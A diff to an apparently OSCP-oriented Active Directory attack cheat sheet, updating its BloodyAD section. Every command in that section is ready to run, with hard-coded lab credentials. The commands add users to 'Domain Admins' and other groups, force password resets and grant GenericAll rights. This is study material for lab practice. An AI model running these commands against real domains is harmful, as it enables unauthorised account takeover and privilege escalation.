@@ -69,25 +69,28 @@ nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' --bloodhound
 ## BloodyAD
 
 ```bash
+cd ~/tools
+
 # BloodyAD - Abuse AD privileges discovered via Bloodhound
+# NOTE: Run from your bloodyAD directory or specify the path
 
 # GenericAll over a group -> Add yourself or another user to that group
-bloodyAD --host 192.168.x.158 -d oscp.example -u 'o.foller' -p 'EarlyMorningFootball777' add groupMember "SRV22 Administrators" o.foller
+python3 bloodyAD --host 192.168.x.158 -d oscp.example -u 'o.foller' -p 'EarlyMorningFootball777' add groupMember "SRV22 Administrators" o.foller
 
 # GenericAll over a user -> Force change their password
-bloodyAD --host 192.168.x.158 -d oscp.example -u 'o.foller' -p 'EarlyMorningFootball777' set password 'j.smith' 'NewPassword123!'
+python3 bloodyAD --host 192.168.x.158 -d oscp.example -u 'o.foller' -p 'EarlyMorningFootball777' set password 'j.smith' 'NewPassword123!'
 
 # GenericWrite over a user -> Add them to a group
-bloodyAD --host 192.168.x.158 -d oscp.example -u 'o.foller' -p 'EarlyMorningFootball777' add groupMember "Domain Admins" j.smith
+python3 bloodyAD --host 192.168.x.158 -d oscp.example -u 'o.foller' -p 'EarlyMorningFootball777' add groupMember "Domain Admins" j.smith
 
 # WriteDACL over a user or group -> Grant yourself GenericAll first, then abuse it
-bloodyAD --host 192.168.x.158 -d oscp.example -u 'o.foller' -p 'EarlyMorningFootball777' add genericAll 'j.smith'
+python3 bloodyAD --host 192.168.x.158 -d oscp.example -u 'o.foller' -p 'EarlyMorningFootball777' add genericAll 'j.smith'
 
 # ForceChangePassword -> Reset a user's password without knowing the current one
-bloodyAD --host 192.168.x.158 -d oscp.example -u 'o.foller' -p 'EarlyMorningFootball777' set password 'j.smith' 'NewPassword123!'
+python3 bloodyAD --host 192.168.x.158 -d oscp.example -u 'o.foller' -p 'EarlyMorningFootball777' set password 'j.smith' 'NewPassword123!'
 
 # Verify group membership was added successfully
-bloodyAD --host 192.168.x.158 -d oscp.example -u 'o.foller' -p 'EarlyMorningFootball777' get groupMember "SRV22 Administrators"
+python3 bloodyAD --host 192.168.x.158 -d oscp.example -u 'o.foller' -p 'EarlyMorningFootball777' get groupMember "SRV22 Administrators"
 # Example Result:
 # [+] l.evgeny added to SRV22 Administrators
 # What to do next? Authenticate with the new privileges:
